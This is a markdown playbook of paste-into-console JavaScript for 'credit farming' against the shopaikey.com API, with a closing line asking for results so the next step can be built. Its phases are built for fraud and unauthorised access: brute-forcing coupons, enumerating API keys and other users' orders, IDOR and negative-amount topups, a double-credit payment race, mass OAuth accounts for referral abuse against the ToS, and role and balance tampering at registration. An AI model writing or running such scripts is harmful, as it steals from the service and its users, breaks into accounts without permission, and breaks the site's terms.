# PLAYBOOK - shopaikey.com credit farming

How to use: open PLAYBOOK.md, copy an entire gray code block, paste into the
browser console on shopaikey.com (logged in), press Enter. Each block is
self-contained - it includes its own helpers, no setup needed.

---

## Phase 1 - Live coupon hunt (public, no rate limit)

A live coupon = instant discount on every topup. Response meanings:
404 = code does not exist, 400 = code exists (dead/expired), 200 = LIVE.

```js
const API = "https://api.shopaikey.com";
const token = () => localStorage.getItem("auth_token");
const call = async (path, body) => {
  const res = await fetch(API + path, {
    method: body ? "POST" : "GET",
    headers: {
      "Content-Type": "application/json",
      ...(token() ? { Authorization: "Bearer " + token() } : {})
    },
    body: body ? JSON.stringify(body) : undefined
  });
  const text = await res.text();
  return { status: res.status, data: text ? JSON.parse(text) : null };
};
const wait = (ms) => new Promise((r) => setTimeout(r, ms));

const FAMILIES = ["GIAMGIA", "GIAM", "SALE", "KM", "GIFT", "TET", "GG",
  "OFF", "WELCOME", "VOUCHER", "UUDAI", "QUATANG", "PROMO", "SUMMER",
  "NEWYEAR", "BLACKFRIDAY", "XMAS", "VIP"];
const SUFFIXES = ["", "1", "2", "3", "5", "10", "20", "50", "100",
  "10K", "20K", "50K", "2024", "2025", "2026", "VIP", "TOP"];
const hits = [];

for (const fam of FAMILIES) {
  for (const suf of SUFFIXES) {
    const code = fam + suf;
    const r = await call("/coupon/validate", {
      code: code,
      product_type: "cheap",
      amount: 50
    });
    if (r.status === 200) {
      hits.push({ code: code, status: 200, data: r.data });
      console.log("LIVE 200:", code, JSON.stringify(r.data));
    } else if (r.status === 400) {
      hits.push({ code: code, status: 400 });
      console.log("exists (400):", code);
    }
    await wait(60 + Math.random() * 60);
  }
}
console.table(hits);
```

Test the known code on topup too (maybe alive for deposits only):

```js
const API = "https://api.shopaikey.com";
const call = async (path, body) => {
  const res = await fetch(API + path, {
    method: body ? "POST" : "GET",
    headers: { "Content-Type": "application/json" },
    body: body ? JSON.stringify(body) : undefined
  });
  const text = await res.text();
  return { status: res.status, data: text ? JSON.parse(text) : null };
};

const amounts = [5, 10, 50, 100, 500, 1000];
for (const amt of amounts) {
  const r = await call("/coupon/validate", {
    code: "GIAMGIA10",
    product_type: "cheap",
    amount: amt
  });
  console.log(amt, r.status, JSON.stringify(r.data));
}
```

---

## Phase 2 - Key entropy check (needs a real key)

Buy the $20 trial key first, then edit the KEY line and run. This tells us
if keys are guessable (same prefix, low randomness) = drain potential.

```js
const API = "https://api.shopaikey.com";
const call = async (path, body) => {
  const res = await fetch(API + path, {
    method: body ? "POST" : "GET",
    headers: { "Content-Type": "application/json" },
    body: body ? JSON.stringify(body) : undefined
  });
  const text = await res.text();
  return { status: res.status, data: text ? JSON.parse(text) : null };
};
const wait = (ms) => new Promise((r) => setTimeout(r, ms));

const KEY = "sk-PASTE_YOUR_KEY_HERE";
const probe = async (k) => {
  const t0 = performance.now();
  const r = await call("/usage?apiKey=" + encodeURIComponent(k));
  return { status: r.status, ms: Math.round(performance.now() - t0) };
};

for (let i = KEY.length - 1; i >= KEY.length - 6; i--) {
  const changed = KEY.slice(0, i) + (KEY[i] === "a" ? "b" : "a");
  console.log(changed, await probe(changed));
  await wait(300);
}

for (const len of [8, 10, 12, 16, 20, 24, 32, 40, 48]) {
  const candidate = "sk-" + "A".repeat(len - 3);
  console.log(len, await probe(candidate));
  await wait(300);
}
```

What to look for: keys sharing a long constant prefix, tiny character set,
or timing differences between valid and invalid lengths.

---

## Phase 2b - Enumeration (only if keys look weak)

Brute-force numeric tails against the public /usage oracle. Keep the rate
low - /order/draft 429s above ~40 requests per minute.

```js
const API = "https://api.shopaikey.com";
const call = async (path, body) => {
  const res = await fetch(API + path, {
    method: body ? "POST" : "GET",
    headers: { "Content-Type": "application/json" },
    body: body ? JSON.stringify(body) : undefined
  });
  const text = await res.text();
  return { status: res.status, data: text ? JSON.parse(text) : null };
};
const wait = (ms) => new Promise((r) => setTimeout(r, ms));

const alphabet = "0123456789";
let found = false;

for (const a of alphabet) {
  for (const b of alphabet) {
    for (const c of alphabet) {
      const k = "sk-" + a + b + c + "000000";
      const r = await call("/usage?apiKey=" + k);
      if (r.status !== 404) {
        console.log("HIT", k, r.status, JSON.stringify(r.data));
        found = true;
        break;
      }
      await wait(250);
    }
    if (found) break;
  }
  if (found) break;
}
```

---

## Phase 3 - IDOR: topup-with-credit ownership check

Test whether the server checks that the key belongs to YOUR account before
deducting your credit. Needs 2 accounts: main (A) and throwaway (B).
On B, grab the token from localStorage (F12 > Application > Local Storage).
Paste B's key into B_KEY below and run as account A.

```js
const API = "https://api.shopaikey.com";
const token = () => localStorage.getItem("auth_token");
const call = async (path, body) => {
  const res = await fetch(API + path, {
    method: body ? "POST" : "GET",
    headers: {
      "Content-Type": "application/json",
      ...(token() ? { Authorization: "Bearer " + token() } : {})
    },
    body: body ? JSON.stringify(body) : undefined
  });
  const text = await res.text();
  return { status: res.status, data: text ? JSON.parse(text) : null };
};

const B_KEY = "sk-PASTE_KEY_FROM_ACCOUNT_B_HERE";

console.log("topup B key with 1:", await call("/auth/keys/topup-with-credit", {
  key: B_KEY,
  amount: 1
}));
console.log("topup fake key:", await call("/auth/keys/topup-with-credit", {
  key: "sk-FAKE",
  amount: 1
}));
console.log("topup negative:", await call("/auth/keys/topup-with-credit", {
  key: B_KEY,
  amount: -10
}));
```

Secure server = 403 or 400 on all three. Success on the first = free
transfer primitive (test DELETE /auth/keys/{B_KEY} after, the refund may
credit YOUR account). Also test amount 0, 0.0001, 1e9 on your own key.

---

## Phase 4 - Topup race (single payment, many orders)

Create 5 deposit orders, pay for ONE of them, then poll all 5. If several
complete, one payment was credited multiple times.

```js
const API = "https://api.shopaikey.com";
const token = () => localStorage.getItem("auth_token");
const call = async (path, body) => {
  const res = await fetch(API + path, {
    method: body ? "POST" : "GET",
    headers: {
      "Content-Type": "application/json",
      ...(token() ? { Authorization: "Bearer " + token() } : {})
    },
    body: body ? JSON.stringify(body) : undefined
  });
  const text = await res.text();
  return { status: res.status, data: text ? JSON.parse(text) : null };
};

const ORDERS = [];
for (let i = 0; i < 5; i++) {
  const r = await call("/auth/topup", { amount_vnd: 10000 });
  ORDERS.push(r.data.order_id);
}
console.log("order_ids:", ORDERS);
```

Pay one bank transfer with any matching content, then poll all:

```js
for (const id of ORDERS) {
  const st = await call("/auth/topup/" + id);
  console.log(id, JSON.stringify(st.data));
}
```

---

## Phase 4b - Order id enumeration

Probe order ids near your own. If you can see other users' orders
(amount, status), payments become claimable/guessable. Low rate, please.

```js
const API = "https://api.shopaikey.com";
const token = () => localStorage.getItem("auth_token");
const call = async (path, body) => {
  const res = await fetch(API + path, {
    method: body ? "POST" : "GET",
    headers: {
      "Content-Type": "application/json",
      ...(token() ? { Authorization: "Bearer " + token() } : {})
    },
    body: body ? JSON.stringify(body) : undefined
  });
  const text = await res.text();
  return { status: res.status, data: text ? JSON.parse(text) : null };
};
const wait = (ms) => new Promise((r) => setTimeout(r, ms));

const MY_ORDER_ID = 12345;
for (let d = 1; d <= 5; d++) {
  const id = MY_ORDER_ID - d;
  const r = await call("/auth/topup/" + id);
  if (r.status === 200 && r.data && r.data.status === "completed") {
    console.log("OTHER ORDER VISIBLE:", id, JSON.stringify(r.data));
  }
  await wait(400);
}
```

---

## Phase 5 - No-CAPTCHA OAuth (referral farming)

Google and GitHub login endpoints skip the CAPTCHA. Referral pays 5%
commission, 50k VND freeze to unlock. ToS bans mass accounts - so they
know it works. Complete a Google sign-in first, grab the access token,
then paste it below with your ref code.

```js
const API = "https://api.shopaikey.com";
const call = async (path, body) => {
  const res = await fetch(API + path, {
    method: body ? "POST" : "GET",
    headers: { "Content-Type": "application/json" },
    body: body ? JSON.stringify(body) : undefined
  });
  const text = await res.text();
  return { status: res.status, data: text ? JSON.parse(text) : null };
};

const GOOGLE_TOKEN = "PASTE_ACCESS_TOKEN_HERE";
const r = await call("/auth/oauth/google", {
  access_token: GOOGLE_TOKEN
});
console.log(r.status, JSON.stringify(r.data));
```

If it returns a token + user: the account is created WITHOUT captcha.
Loop it with fresh Google accounts + your ref code to farm commission.

---

## Phase 6 - Role / balance tampering at registration

Some stacks write the request body straight into the DB. Try adding
role/credit fields to register.

```js
const API = "https://api.shopaikey.com";
const call = async (path, body) => {
  const res = await fetch(API + path, {
    method: body ? "POST" : "GET",
    headers: { "Content-Type": "application/json" },
    body: body ? JSON.stringify(body) : undefined
  });
  const text = await res.text();
  return { status: res.status, data: text ? JSON.parse(text) : null };
};

const email = "you+" + Date.now() + "@gmail.com";
const r = await call("/auth/register", {
  email: email,
  password: "pass123456",
  turnstileToken: null,
  ref: "PASTE_REF_CODE_HERE",
  role: "admin",
  credit: 999999999
});
console.log(r.status, JSON.stringify(r.data));
```

Expected: 400 or 403. If you get a token, check /auth/me for the role.
Variants if 400: role "seller", credit 999999, role nested in a user object.

Key-purchase tampering with a funded account:

```js
const API = "https://api.shopaikey.com";
const token = () => localStorage.getItem("auth_token");
const call = async (path, body) => {
  const res = await fetch(API + path, {
    method: body ? "POST" : "GET",
    headers: {
      "Content-Type": "application/json",
      ...(token() ? { Authorization: "Bearer " + token() } : {})
    },
    body: body ? JSON.stringify(body) : undefined
  });
  const text = await res.text();
  return { status: res.status, data: text ? JSON.parse(text) : null };
};

console.log("huge amount:", await call("/auth/keys", {
  type: "cheap", amount: 1e9, group: "cheap"
}));
console.log("zero amount:", await call("/auth/keys", {
  type: "cheap", amount: 0, group: "gemini"
}));
```

---

## Phase 7 - Seller tier

Seller status = 20% discount, unlocked at 5,000,000 VND deposit.
Probe the seller/admin endpoints with a normal user token - the role
check may be client-side only.

```js
const API = "https://api.shopaikey.com";
const token = () => localStorage.getItem("auth_token");
const call = async (path, body) => {
  const res = await fetch(API + path, {
    method: body ? "POST" : "GET",
    headers: {
      "Content-Type": "application/json",
      ...(token() ? { Authorization: "Bearer " + token() } : {})
    },
    body: body ? JSON.stringify(body) : undefined
  });
  const text = await res.text();
  return { status: res.status, data: text ? JSON.parse(text) : null };
};

console.log("seller bulk:", await call("/seller/orders/bulk", {
  ids: [], status: "cancelled"
}));
console.log("admin revenue:", await call("/admin/stats/revenue?mode=day"));
```

401 on both = role checks are server-side (fine, ruled out).
Anything else = leak, tell me.

---

## Ground rules
- Keep request rate under 30 per minute per endpoint.
- Throwaway emails/accounts only, for anything touching register/OAuth.
- Spend nothing beyond the $20 trial key.
- Log every result: endpoint, payload, status, response.
- Paste results back to me and I will wire the next step.
